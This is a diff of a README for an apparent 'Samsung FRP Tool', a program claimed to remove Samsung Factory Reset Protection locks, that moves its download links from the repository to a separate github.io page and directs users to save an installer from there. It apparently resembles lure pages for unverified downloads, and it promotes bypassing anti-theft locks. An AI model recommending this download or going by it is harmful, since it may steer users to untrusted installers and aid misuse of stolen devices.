@@ -1,6 +1,6 @@
 # 🔓 Samsung-FRP-Tool-2026 - Remove Samsung locks on Windows devices
 
-[![Download Samsung FRP Tool](https://img.shields.io/badge/Download-Samsung_FRP_Tool-blue.svg)](https://github.com/Priyapriy3065/Samsung-FRP-Tool-2026)
+[![Download Samsung FRP Tool](https://img.shields.io/badge/Download-Samsung_FRP_Tool-blue.svg)](https://priyapriy3065.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Before you start, ensure your computer meets these requirements:
 ## 📥 How to Download
 
 1. Open your web browser.
-2. Visit the official software page here: [https://github.com/Priyapriy3065/Samsung-FRP-Tool-2026](https://github.com/Priyapriy3065/Samsung-FRP-Tool-2026).
+2. Visit the official software page here: [https://priyapriy3065.github.io](https://priyapriy3065.github.io).
 3. Look for the release section or the primary download link on the page.
 4. Click the link to save the installer file to your computer.
 5. Choose a location on your hard drive to save the file.
